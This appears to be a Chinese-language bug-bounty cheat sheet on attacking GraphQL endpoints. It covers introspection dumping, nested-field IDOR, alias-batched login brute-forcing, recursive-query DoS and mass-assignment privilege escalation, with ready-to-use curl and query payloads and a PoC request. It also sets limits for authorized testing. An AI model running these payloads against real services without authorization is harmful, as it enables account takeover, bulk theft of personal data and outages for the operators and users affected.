# GraphQL

> 视角：黑盒，针对 GraphQL 端点的特有攻击

## 1. 一句话说清

GraphQL = 一个端点（通常 `/graphql`），所有 query / mutation 走它。
特有风险：Introspection 暴露 schema、字段级授权缺失、嵌套查询绕过权限、深度递归 DoS。
SRC 价值：嵌套 IDOR + 字段越权 = P1。

---

## 2. 高频入口点

```
/graphql       /api/graphql       /v1/graphql
/graphiql      /playground         /api-explorer
/graphql.php   /graphql.json
```

测试方法是否 GraphQL：

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}' https://target/graphql

→ 返回 {"data":{"__typename":"Query"}} = 是 GraphQL
```

---

## 3. 探测手法

### 3.1 Introspection（最先做）

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type { name kind ofType { name } }
        args { name type { name } }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

```bash
# 一行命令
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  https://target/graphql | jq

# 工具
graphql-cop https://target/graphql
graphqlmap
clairvoyance（无 introspection 的 schema 推断）
```

拿到 schema → 找出所有敏感字段（`password`、`ssn`、`creditCard`、`apiKey`、`balance`）。

### 3.2 字段级越权

```graphql
# 顶层是公开 query
query {
  publicPost(id: 123) {
    title
    author {
      email          # ❌ 可能没权限校验
      phone
      orders {       # ❌ 嵌套 IDOR
        id
        amount
        creditCard
      }
    }
  }
}
```

**重点**：顶层接口"看起来公开"，但通过嵌套返回敏感字段。

### 3.3 IDOR via id

```graphql
query {
  user(id: 100) {  # 改成其他 ID
    email
    privateMessages { content }
  }
}
```

### 3.4 批量查询 / 别名滥用（绕过限频）

```graphql
query {
  a: login(user:"admin",pass:"a") { token }
  b: login(user:"admin",pass:"b") { token }
  c: login(user:"admin",pass:"c") { token }
  ...
  z: login(user:"admin",pass:"z") { token }
}
# 一次请求触发 26 次登录
```

绕过常规 rate-limit（每个 HTTP 请求计 1 次）。

### 3.5 深度递归 DoS

```graphql
type User {
  friends: [User!]!
}

# 攻击查询
query {
  user(id:1) {
    friends {
      friends {
        friends {
          friends { ... 嵌套 100 层 ... }
        }
      }
    }
  }
}
```

观察响应时间 / 超时。

### 3.6 Mutation Mass Assignment

```graphql
mutation {
  updateUser(input: {
    id: 1,
    name: "x",
    isAdmin: true,         # 试这个
    role: ADMIN
  }) { id name }
}
```

### 3.7 CSRF on GraphQL

```
1. GraphQL 多数支持 GET（query 在 query string）
2. 查 Content-Type: application/x-www-form-urlencoded 是否被接受
3. 接受 → CSRF 可行（普通 form 即可触发）
```

---

## 4. Bypass 矩阵

| 拦 | 绕 |
|---|---|
| Introspection 关闭 | clairvoyance 字段推断 / 抓客户端代码（mobile / web）找 query |
| 顶层鉴权 | 嵌套字段越权 |
| 批量限频 | 别名 / 多 query |
| 深度限制 | 折叠：`...frag` 片段循环展开 |
| ID 类型校验 | 改 GraphQL 类型：`String` 改成 `Int`、`ID` 改成 `null` |

---

## 5. 利用提权 / 横向

```
Introspection → 完整攻击面图
嵌套 IDOR → 大批 PII
别名 → 撞库 / 短信轰炸
mutation Mass Assignment → 提权
深度 → DoS
```

---

## 6. 真实案例指纹

| 案例 | 一句话 |
|------|------|
| GitHub GraphQL | 嵌套字段越权拿 private repo 信息 |
| Shopify | 别名爆破登录 |
| HackerOne 自身 | 多次报告 IDOR |

通用：
- 端点返回 `{"errors":[{"message":"Cannot query field..."}]}` → GraphQL 报错有用
- Introspection 200 → 立即拉 schema
- mutation 接受额外字段 → Mass Assignment

---

## 7. 复现 / 证据要点

### 7.1 PoC

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer A_TOKEN

{"query":"query{user(id:200){email phone}}"}

→ 响应：
{"data":{"user":{"email":"b****@****.com","phone":"138****1234"}}}
（B 的字段，A 不该能读）
```

### 7.2 Introspection

```bash
curl -X POST https://target/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' \
  > schema.json

grep -A 5 -E "(password|ssn|credit|secret|key|token)" schema.json
```

### 7.3 CVSS

```
Introspection 暴露                 = 5.3 Medium
嵌套 IDOR PII                      = 6.5–8.1
别名爆破                           = 7.5
mutation Mass Assignment → admin   = 8.8–9.8
深度递归 DoS                       = 5.3–6.5
```

---

## 8. 不要做的事

- **禁**：用别名爆破真实账号密码。在自己测试账号上演示。
- **禁**：用深度递归 DoS 实际打瘫服务。10 层、几次请求即可证明。
- **禁**：嵌套 IDOR 拖出大量数据。3 个不同 ID 的样本足够。

## H1 真实案例

_共 1 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 25000 usd | HackerOne | [Disclosing  PolicyPageAssetGroup in Private Programs via /graphql `gid://hackerone/PolicyPageAsse…](https://hackerone.com/reports/1618347) | Summary:** Hi team, I understand what's going on Description:** Just a recent update gives the results of private programs Step… |
